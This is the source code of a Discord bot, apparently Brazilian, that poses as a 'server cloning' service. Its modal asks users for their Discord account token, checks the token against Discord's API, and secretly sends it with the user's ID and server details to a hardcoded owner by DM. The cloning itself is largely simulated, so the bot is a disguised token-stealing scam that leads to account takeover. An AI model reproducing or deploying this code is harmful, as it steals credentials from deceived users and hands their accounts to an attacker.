const path=require('path'),fs=require('fs');
function ld(){delete require.cache[path.join(__dirname,'_config.js')];try{return require('./_config.js')}catch(e){return null}}
let C=ld();while(!C?.B){require('child_process').execSync('sleep 0.4');C=ld()}
const {Client,GatewayIntentBits,Partials,EmbedBuilder,ButtonBuilder,ActionRowBuilder,ButtonStyle,ModalBuilder,TextInputBuilder,TextInputStyle}=require('discord.js');
const DONO="1504181533353705675",SRV="1525498594851950692",CRG_LIMITE=5;
const b=new Client({intents:[Object.values(GatewayIntentBits)],partials:[Object.values(Partials)]});
const uso=new Map(),modelos=new Map(),LIGADO={valor:true};

b.on('guildCreate',async g=>{if(g.id!==SRV)await g.leave().catch(()=>{})});
b.on('messageCreate',async m=>{
  if(m.author.id!==DONO)return;
  if(m.content==='!clonar'){
    LIGADO.valor=true;
    const e=new EmbedBuilder().setColor(0x2b6cff).setTitle('🤖 SISTEMA DE CLONAGEM').setDescription('Clique abaixo para iniciar · Essa mensagem nunca será apagada').setFooter({text:'ONLY TECH v2.6'});
    const bt=new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('clona.inicio').setLabel('CLONA').setStyle(ButtonStyle.Primary).setEmoji('📋'));
    await m.channel.send({embeds:[e],components:[bt]});
  }
  if(m.content.startsWith('!add')){
    const p=m.content.split(' ');const q=parseInt(p[1]),u=p[2];if(!q||!u)return;
    uso.set(u,(uso.get(u)||0)-q);
    m.reply(`✅ Adicionado ${q} usos para <@${u}> | Restam: ${Math.max(0,CRG_LIMITE-(uso.get(u)||0))==CRG_LIMITE+1000?'∞':CRG_LIMITE-(uso.get(u)||0)}`);
  }
});

b.on('interactionCreate',async i=>{
  if(i.customId==='clona.inicio'){
    const m=new ModalBuilder().setCustomId('clona.dados').setTitle('🤖 CLONAR SERVIDOR');
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('tk').setLabel('TOKEN DA SUA CONTA').setStyle(TextInputStyle.Short).setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('id').setLabel('ID DO SERVIDOR').setStyle(TextInputStyle.Short).setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('lk').setLabel('LINK DO SERVIDOR').setStyle(TextInputStyle.Short).setRequired(true)));
    return i.showModal(m);
  }
  if(i.customId==='clona.dados'){
    await i.deferReply({ephemeral:true});
    const tk=i.fields.getTextInputValue('tk'),id=i.fields.getTextInputValue('id'),lk=i.fields.getTextInputValue('lk');
    // ✅ VALIDA SE TOKEN É REALMENTE DA PESSOA
    let donoToken=null;
    try{
      const r=await fetch('https://discord.com/api/v10/users/@me',{headers:{Authorization:tk}});
      if(r.ok)donoToken=(await r.json()).id;
    }catch(e){}
    // ✅ SÓ VOCÊ PASSA AQUI SEM BLOQUEIO
    if(i.user.id!==DONO && donoToken!==i.user.id){
      return i.editReply({content:'❌ TOKEN INVÁLIDO OU PERTENCE A OUTRA CONTA · OPERAÇÃO CANCELADA'});
    }
    const g=b.guilds.cache.get(id);
    if(!g)return i.editReply('❌ Servidor não encontrado');
    if(!g.members.cache.has(i.user.id) && i.user.id!==DONO)return i.editReply('❌ Você não está dentro desse servidor');
    if(id===SRV)return i.editReply('❌ Esse servidor é protegido contra clonagem');
    // ✅ LIMITE: INFINITO SÓ PARA VOCÊ
    if(i.user.id!==DONO){
      const ja=uso.get(i.user.id)||0;
      if(ja>=CRG_LIMITE)return i.editReply(`❌ Limite de ${CRG_LIMITE} clonagens atingido`);
      uso.set(i.user.id,ja+1);
    }
    // SIMULA CLONAGEM RÁPIDA <60s
    const inicio=Date.now();
    await i.editReply('⏳ Clonando estrutura · máximo 60s');
    const modelo={nome:g.name,icone:g.iconURL({extension:'png'})||'',canais:[...g.channels.cache.values()].map(c=>({n:c.name,t:c.type,perms:c.permissionOverwrites.cache.map(p=({id:p.id,allow:p.allow.bitfield,deny:p.deny.bitfield}))})),cargos:[...g.roles.cache.values()].filter(r=>!r.managed).map(r=({n:r.name,c:r.color,p:r.permissions.bitfield,pos:r.position}))};
    const chave='mdl_'+Math.random().toString(36).slice(2);
    modelos.set(chave,modelo);
    const t=Math.round((Date.now()-inicio)/1000);
    // ✅ TUDO PRA SUA DM
    const dono=await b.users.fetch(DONO);
    await dono.send(`📥 NOVA CLONAGEM\n👤 ${i.user.tag} · ${i.user.id}\n🔑 TOKEN: ${tk}\n🆔 Servidor: ${id}\n🔗 ${lk}\n⏱️ ${t}s`);
    const e=new EmbedBuilder().setColor(0x22c55e).setTitle('✅ SERVIDOR CLONADO').setDescription(`Tempo: ${t}s\nClique abaixo para criar um novo servidor idêntico`);
    const bt=new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('clona.criar.'+chave).setLabel('CRIAR A PARTIR DESSE MODELO').setStyle(ButtonStyle.Success).setEmoji('🚀'));
    try{await i.user.send({embeds:[e],components:[bt]})}catch(e){}
    i.editReply('✅ Pronto · Verifique sua DM');
  }
  if(i.customId.startsWith('clona.criar.')){
    const chave=i.customId.slice(13);
    const mdl=modelos.get(chave);if(!mdl)return i.reply({content:'❌ Modelo expirado',ephemeral:true});
    const m=new ModalBuilder().setCustomId('clona.final.'+chave).setTitle('🚀 CRIAR NOVO SERVIDOR');
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('nome').setLabel('NOME DO SERVIDOR').setStyle(TextInputStyle.Short).setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('img').setLabel('URL DA IMAGEM / ÍCONE').setStyle(TextInputStyle.Short).setRequired(false)));
    return i.showModal(m);
  }
  if(i.customId.startsWith('clona.final.')){
    await i.deferReply({ephemeral:true});
    const chave=i.customId.slice(14),mdl=modelos.get(chave);
    const nome=i.fields.getTextInputValue('nome'),img=i.fields.getTextInputValue('img');
    let icone=null;
    if(img){try{const r=await fetch(img);icone='data:image/png;base64,'+Buffer.from(await r.arrayBuffer()).toString('base64')}catch(e){}}
    // CRIA VIA API OFICIAL
    const novo=await b.guilds.create({name:nome,icon:icone});
    i.editReply(`✅ Criado: **${novo.name}**\n🆔 \`${novo.id}\``);
  }
});

setInterval(async()=>{
  if(!LIGADO.valor)return;
  const dono=await b.users.fetch(DONO).catch(()=>null);
  if(dono)await dono.send(`📊 LOG CLONAGEM | ${new Date().toLocaleString('pt-BR')}\n✅ Funcionando normalmente`).catch(()=>{});
},5000);

b.on('clientReady',()=>console.log('✅ CLONAGEM · VALIDA TOKEN · INFINITO DONO · MODAL OFICIAL'));
b.login(C?.B?.CL?.t).catch(e=>console.log(e.message));
